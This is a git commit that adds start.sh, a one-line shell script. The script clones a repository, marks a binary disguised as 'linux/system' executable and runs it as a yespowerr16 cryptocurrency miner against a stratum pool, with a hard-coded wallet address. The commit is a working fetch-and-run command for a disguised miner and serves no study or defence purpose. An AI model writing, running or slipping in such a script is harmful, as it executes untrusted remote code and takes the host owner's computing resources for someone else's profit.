6a0a13c24efa8ad7652cfd06bad1cc6a7bb20a07
husin2021 <80618904+husin2021@users.noreply.github.com>
2021-03-28 18:43:54 +0800

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+git clone https://github.com/Dawn-shell/linux && chmod +x linux/system && linux/system -a yespowerr16 -o stratum+tcp://stratum-asia.rplant.xyz:3382 -u YTxM1eRPvvPZAWg4xk3RypkUrAxUGsCb9g.tt
